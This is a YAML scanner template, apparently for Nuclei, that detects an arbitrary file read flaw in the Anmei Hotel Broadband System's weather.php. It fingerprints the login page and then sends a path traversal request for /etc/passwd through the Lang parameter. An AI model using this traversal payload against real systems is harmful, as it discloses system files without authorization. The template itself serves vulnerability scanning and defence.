id: poc-yaml-amttgroup-weather-php-anyfile-read
info:
  name: Anmei Digital Hotel Broadband System weather.php Arbitrary File Read Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
  metadata:
    product: Anmei Hotel Broadband System
http:
  - raw:
      - |
        GET /manager/login.php HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "酒店宽带运营系统"
  - raw:
      - |
        GET /user/weather.php?Lang=../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root:"
          - "/bin"
      - type: word
        part: body
        words:
          - "<"
        negative: true
